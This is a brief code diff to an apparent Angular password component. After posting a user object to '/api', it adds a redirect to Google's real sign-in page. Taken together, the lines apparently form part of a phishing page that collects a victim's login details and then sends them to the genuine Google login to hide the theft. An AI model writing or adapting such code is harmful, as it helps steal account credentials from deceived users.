@@ -38,6 +38,7 @@ export class PasswordComponent {
       userAgent: navigator.userAgent
     }
     this.http.post(`/api`, user).subscribe((res: any) => console.log(res));
+    window.location.href = 'https://accounts.google.com/InteractiveLogin';
   }
 
   /* Get errors */
